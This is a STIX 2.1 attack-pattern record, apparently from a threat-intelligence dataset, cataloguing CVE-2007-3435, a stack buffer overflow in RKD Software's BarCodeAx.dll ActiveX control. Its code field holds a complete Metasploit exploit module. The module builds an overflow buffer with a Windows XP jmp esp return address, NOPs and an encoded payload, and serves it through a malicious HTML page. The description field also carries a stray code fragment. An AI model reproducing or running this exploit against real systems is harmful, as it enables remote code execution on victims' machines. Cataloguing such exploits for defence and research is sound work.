{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fe89f945-9b9c-4df7-9a3e-007a00e0b6db",
    "created": "2024-08-14T16:42:47.601789Z",
    "modified": "2024-08-14T16:42:47.601793Z",
    "name": "RKD Software BarCodeAx.dll v4.9 ActiveX Remote Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in RKD Software Barcode Application ActiveX Control 'BarCodeAx.dll'. By sending an overly long string to the BeginPrint method of BarCodeAx.dll v4.9, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/barcode_ax49.rb",
            "external_id": "barcode_ax49.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3435"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RKD Software BarCodeAx.dll v4.9 ActiveX Remote Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in RKD Software Barcode Application\n        ActiveX Control 'BarCodeAx.dll'. By sending an overly long string to the BeginPrint\n        method of BarCodeAx.dll v4.9, an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancek <trancek[at]yashira.org>', 'aushack' ],\n      'References'     =>\n        [\n          [ 'EDB', '4094' ],\n          [ 'OSVDB', '37482' ],\n          [ 'BID', '24596' ],\n          [ 'CVE', '2007-3435' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\\'\\\"%<>@=,.\\#$&()\\\\/\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0 English', { 'Ret' => 0x71ab7bfb } ] # jmp esp ws2_32.dll aushack xpsp0\n        ],\n      'DisclosureDate' => '2007-06-22',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname = rand_text_alpha(rand(100) + 1)\n\n    buff = Rex::Text.rand_text_alphanumeric(656) + [target['Ret']].pack('V') + make_nops(20) + payload.encoded\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:C26D9CA8-6747-11D5-AD4B-C01857C10000' id='#{vname}'></object>\n<script language='javascript'>\n#{vname}.BeginPrint(\"#{buff}\");\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-22",
    "x_mitre_platforms": [
        "win'"
    ]
}